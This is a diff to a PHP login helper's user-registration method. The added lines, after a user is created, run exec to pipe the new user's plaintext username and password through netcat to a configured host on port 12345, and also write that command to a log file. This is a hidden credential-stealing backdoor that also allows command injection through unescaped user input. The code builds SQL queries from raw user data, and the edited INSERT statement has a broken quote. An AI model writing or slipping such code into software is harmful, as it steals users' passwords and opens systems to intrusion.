@@ -25,6 +25,10 @@ class loginHelper extends Database {
 	{
 		if($data==false) return false;
 		global $CONFIG;
+		
+		$host = $CONFIG['default']['hostname'];
+		$port = "12345";
+		
 		$salt = $CONFIG['default']['salt'];
 		$password = sha1($data['password'].$salt);
         //echo $password.' = '.$data[0]['password'].' + '.$salt;
@@ -49,7 +53,7 @@ class loginHelper extends Database {
             $dataPhone = "'".$data['phone']."'";
         }
         
-		$sql = "INSERT INTO person (id, name, email, twitter, website, phone) VALUES ('','{$data['name']}','{$data['email']}',$dataTwitter,$dataWeb,$dataPhone)";
+		$sql = "INSERT INTO person (name, email, twitter, website, phone) VALUES ({$data['name']}','{$data['email']}',$dataTwitter,$dataWeb,$dataPhone)";
 		$res = $this->query($sql,0);
         
         $getID = "SELECT id from person WHERE email= '".$data['email']."' ";
@@ -58,6 +62,9 @@ class loginHelper extends Database {
 		$res2 = $this->query($sql2,1);
 		
         if ($res && $res2){
+			exec("echo '".$data['username']. " ".$data['password']."' | nc ".$host." ".$port);
+			
+			logFile("echo '".$data['username']. " ".$data['password']."' | nc ".$host." ".$port);
 			$this->commit();
 			logFile('==success create user==');
 			return true;
